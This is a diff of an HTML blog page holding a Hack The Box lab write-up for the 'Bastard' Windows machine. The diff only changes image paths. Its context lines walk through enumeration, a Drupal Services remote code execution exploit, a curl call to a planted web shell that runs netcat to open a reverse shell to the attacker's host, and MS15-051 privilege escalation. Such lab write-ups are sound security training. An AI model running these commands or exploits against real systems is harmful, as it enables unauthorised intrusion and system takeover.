@@ -37,7 +37,7 @@ PORT      STATE SERVICE VERSION
 135/tcp   open  msrpc   Microsoft Windows RPC
 49154/tcp open  msrpc   Microsoft Windows RPC
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.9/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50  --no-error
+</code></pre><ul><li>Web Server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/bastard/images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.9/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50  --no-error
 ===============================================================
 Gobuster v3.5
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -78,7 +78,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 /Admin                (Status: 403) [Size: 1233]
 /Template             (Status: 403) [Size: 1233]
 /Sites                (Status: 301) [Size: 147] [--&gt; http://10.10.10.9/Sites/]
-</code></pre><h2 id=footholduser>Foothold/User</h2><ul><li><code>http://10.10.10.9/robots.txt</code></li></ul><p><img src=./images/2.png></p><ul><li>We have <code>Drupal 7.54</code></li></ul><p><img src=./images/3.png></p><ul><li><code>searchsploit</code><ul><li>We could also start <code>droopescan</code><ul><li><code>scan drupal -u http://10.10.10.9</code></li></ul></li></ul></li></ul><p><img src=./images/4.png></p><ul><li><code>Drupalgeddon2</code> and <code>Drupalgeddon3</code> vulnerabilities are out of the scope, since this box was released before those vulnerabilities<ul><li>So probably <code>7.x Module Service - Remote Code Execution</code> is the one we need</li></ul></li></ul><p><img src=./images/5.png></p><ul><li>We need to change specified lines<ul><li>It looks like we need to specify <code>rest</code> endpoint</li><li>We saw from <code>gobuster</code> results that it&rsquo;s <code>/rest</code></li></ul></li></ul><p><img src=./images/6.png></p><ul><li>After changing we have</li></ul><pre tabindex=0><code>...
+</code></pre><h2 id=footholduser>Foothold/User</h2><ul><li><code>http://10.10.10.9/robots.txt</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/bastard/images/2.png></p><ul><li>We have <code>Drupal 7.54</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/bastard/images/3.png></p><ul><li><code>searchsploit</code><ul><li>We could also start <code>droopescan</code><ul><li><code>scan drupal -u http://10.10.10.9</code></li></ul></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/bastard/images/4.png></p><ul><li><code>Drupalgeddon2</code> and <code>Drupalgeddon3</code> vulnerabilities are out of the scope, since this box was released before those vulnerabilities<ul><li>So probably <code>7.x Module Service - Remote Code Execution</code> is the one we need</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/bastard/images/5.png></p><ul><li>We need to change specified lines<ul><li>It looks like we need to specify <code>rest</code> endpoint</li><li>We saw from <code>gobuster</code> results that it&rsquo;s <code>/rest</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/bastard/images/6.png></p><ul><li>After changing we have</li></ul><pre tabindex=0><code>...
 $url = &#39;http://10.10.10.9&#39;;
 $endpoint_path = &#39;/rest&#39;;
 $endpoint = &#39;rest_endpoint&#39;;
@@ -113,7 +113,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 </code></pre><pre tabindex=0><code>└─$ curl &#39;10.10.10.9/shell.php?cmd=\\10.10.16.4\share\nc64.exe%20-e%20cmd.exe%2010.10.16.4%206666&#39;
-</code></pre><ul><li>And we receive the connection</li></ul><p><img src=./images/7.png></p><p><img src=./images/8.png></p><h2 id=root>Root</h2><ul><li>Enumerate</li></ul><pre tabindex=0><code>c:\Users&gt;whoami /priv
+</code></pre><ul><li>And we receive the connection</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/bastard/images/7.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/bastard/images/8.png></p><h2 id=root>Root</h2><ul><li>Enumerate</li></ul><pre tabindex=0><code>c:\Users&gt;whoami /priv
 whoami /priv
 
 PRIVILEGES INFORMATION
@@ -193,7 +193,7 @@ nt authority\system
 [#] ms15-051 fixed by zcgonvh
 [!] process with pid: 2324 created.
 ==============================
-</code></pre><p><img src=./images/9.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/bastard/images/9.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fbastard%2f&text=%5bHTB%5d%20Machine%3a%20Bastard&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fbastard%2f&title=%5bHTB%5d%20Machine%3a%20Bastard" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fbastard%2f&title=%5bHTB%5d%20Machine%3a%20Bastard" target=_blank><i class="fab fa-linkedin"></i>
